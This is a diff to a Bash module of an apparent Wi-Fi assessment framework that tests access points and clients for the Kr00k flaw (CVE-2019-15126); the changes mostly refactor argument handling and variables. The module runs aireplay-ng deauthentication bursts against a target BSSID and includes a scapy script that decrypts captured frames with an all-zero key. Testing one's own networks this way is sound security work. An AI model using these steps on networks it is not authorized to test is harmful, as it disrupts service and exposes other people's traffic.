@@ -10,8 +10,6 @@
 # PCAP="yes"
 # DECODE="wifi_mgmt"
 
-set -uo pipefail
-
 #===============================================================================
 #  modules/e5_kr00k_test.sh
 #  E5: Kr00k Vulnerability Test (CVE-2019-15126)
@@ -34,9 +32,36 @@ set -uo pipefail
 #    - clients_vulnerable: int
 #===============================================================================
 
+set -uo pipefail
+
 run_e5() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=6
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e5"
+    local evidence_prefix="${evidence_dir}/e5"
 
     #--- Step 1: Verify tools ---
     log_step 1 $total_steps "Verifying tools"
@@ -49,15 +74,18 @@ run_e5() {
         return 1
     fi
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     #--- Info banner ---
     echo ""
@@ -86,7 +114,7 @@ run_e5() {
     {
         echo "============================================================"
         echo "  E5: Kr00k Vulnerability Test"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "============================================================"
     } > "$results_file"
 
@@ -94,11 +122,12 @@ run_e5() {
     log_step 2 $total_steps "Enabling monitor mode"
     update_tc_progress 2 $total_steps "Monitor mode"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     check_abort || return 1
@@ -108,7 +137,7 @@ run_e5() {
     update_tc_progress 3 $total_steps "Capture"
 
     spawn_bg "e5_tcpdump" "tcpdump" -i "$mon_iface" -w "$cap_file" \
-        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}"
+        "ether src ${bssid} or ether dst ${bssid}"
     
     sleep 3
 
@@ -122,7 +151,7 @@ run_e5() {
     
     # Send bursts of deauths to target BSSID
     for i in {1..3}; do
-        run_fg "aireplay-ng" --deauth 5 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+        run_fg "aireplay-ng" --deauth 5 -a "$bssid" "$mon_iface" &>/dev/null || true
         sleep 5
     done
     
@@ -171,32 +200,30 @@ def check_kr00k(pcap_file, bssid):
             addr3 = pkt.addr3.lower() if pkt.addr3 else ""
             
             # Only care about frames to/from our target AP
-            if bssid not in [addr1, addr2, addr3]:
-                continue
+            if bssid in [addr1, addr2, addr3]:
+                ccmp = pkt[Dot11CCMP]
                 
-            ccmp = pkt[Dot11CCMP]
-            
-            try:
-                # Full kr00k checking requires exact nonce construction:
-                pn = struct.pack(">Q", ccmp.PN)[2:] # 6 bytes
-                priority = pkt.SC & 0x0F # QoS priority
-                nonce = bytes([priority]) + bytes.fromhex(addr2.replace(':','')) + pn
-                
-                cipher = Cipher(algorithms.AES(zero_tk), modes.CCM(nonce, tag=ccmp.data[-8:]), backend=default_backend())
-                decryptor = cipher.decryptor()
-                decryptor.authenticate_additional_data(b"") # AAD omitted for basic check
-                
-                plaintext = decryptor.update(ccmp.data[:-8]) + decryptor.finalize()
-                
-                # Check for LLC/SNAP header (AA AA 03) or IPv4 (45)
-                if plaintext.startswith(b'\xaa\xaa\x03') or plaintext.startswith(b'\x45'):
-                    if addr2 == bssid:
-                        vuln_aps.add(bssid)
-                    else:
-                        vuln_clients.add(addr2)
-            except Exception:
-                # Decryption failed or tag mismatch (not Kr00k)
-                pass
+                try:
+                    # Full kr00k checking requires exact nonce construction:
+                    pn = struct.pack(">Q", ccmp.PN)[2:] # 6 bytes
+                    priority = pkt.SC & 0x0F # QoS priority
+                    nonce = bytes([priority]) + bytes.fromhex(addr2.replace(':','')) + pn
+                    
+                    cipher = Cipher(algorithms.AES(zero_tk), modes.CCM(nonce, tag=ccmp.data[-8:]), backend=default_backend())
+                    decryptor = cipher.decryptor()
+                    decryptor.authenticate_additional_data(b"") # AAD omitted for basic check
+                    
+                    plaintext = decryptor.update(ccmp.data[:-8]) + decryptor.finalize()
+                    
+                    # Check for LLC/SNAP header (AA AA 03) or IPv4 (45)
+                    if plaintext.startswith(b'\xaa\xaa\x03') or plaintext.startswith(b'\x45'):
+                        if addr2 == bssid:
+                            vuln_aps.add(bssid)
+                        else:
+                            vuln_clients.add(addr2)
+                except Exception:
+                    # Decryption failed or tag mismatch (not Kr00k)
+                    pass
 
     if vuln_aps:
         print(f"AP_VULNERABLE={list(vuln_aps)[0]}")
@@ -212,7 +239,7 @@ EOF
         log_info "Running decryption analysis on captured frames..."
         ensure_user_ownership "$cap_file"
         local py_out
-        py_out=$(run_as_user python3 "$scapy_script" "$cap_file" "$GUEST_BSSID" 2>/dev/null || true)
+        py_out=$(run_as_user python3 "$scapy_script" "$cap_file" "$bssid" 2>/dev/null || true)
         
         echo "$py_out" >> "$results_file"
         
@@ -287,15 +314,16 @@ EOF
 
     save_tc_result "E5" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
     save_session_state
-# Display summary
-echo ""
-if [[ "$ap_vulnerable" == "true" ]]; then
-    log_result "CRITICAL" "★ Kr00k Vulnerability CONFIRMED on AP"
-elif [[ $clients_vulnerable -gt 0 ]]; then
-    log_result "FINDING" "★ Kr00k Vulnerability CONFIRMED on ${clients_vulnerable} client(s)"
-else
-    log_result "SECURE" "Kr00k vulnerability not detected"
-fi
 
-return 0
+    # Display summary
+    echo ""
+    if [[ "$ap_vulnerable" == "true" ]]; then
+        log_result "CRITICAL" "★ Kr00k Vulnerability CONFIRMED on AP"
+    elif [[ $clients_vulnerable -gt 0 ]]; then
+        log_result "FINDING" "★ Kr00k Vulnerability CONFIRMED on ${clients_vulnerable} client(s)"
+    else
+        log_result "SECURE" "Kr00k vulnerability not detected"
+    fi
+
+    return 0
 }
